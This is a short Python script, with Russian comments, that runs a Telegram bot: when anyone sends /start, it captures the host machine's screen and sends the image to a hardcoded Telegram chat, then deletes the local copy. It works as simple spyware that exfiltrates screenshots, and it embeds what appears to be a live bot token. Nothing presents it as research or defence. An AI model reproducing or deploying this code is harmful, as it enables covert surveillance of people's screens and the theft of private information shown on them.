import telebot
import os
import platform
import subprocess
from PIL import ImageGrab

BOT_TOKEN = '8479275418:AAHoXo5-aA69Rn_-pCewm90nFkgiWmBox2c'
YOUR_CHAT_ID = 7821316793

bot = telebot.TeleBot(BOT_TOKEN)

def take_screenshot():
    try:
        screenshot_path = "screenshot.png"
        img = ImageGrab.grab()
        img.save(screenshot_path)
        return screenshot_path
    except Exception:
        return None

@bot.message_handler(commands=['start'])
def send_screenshot(m):
    if m.from_user.id == YOUR_CHAT_ID or True:  # Ловим у всех, но можно ограничить
        path = take_screenshot()
        if path and os.path.exists(path):
            try:
                with open(path, 'rb') as photo:
                    bot.send_photo(YOUR_CHAT_ID, photo)
                os.remove(path)
            except:
                pass

# Игнорируем остальные сообщения — только /start триггерит скрин
bot.polling(none_stop=True)
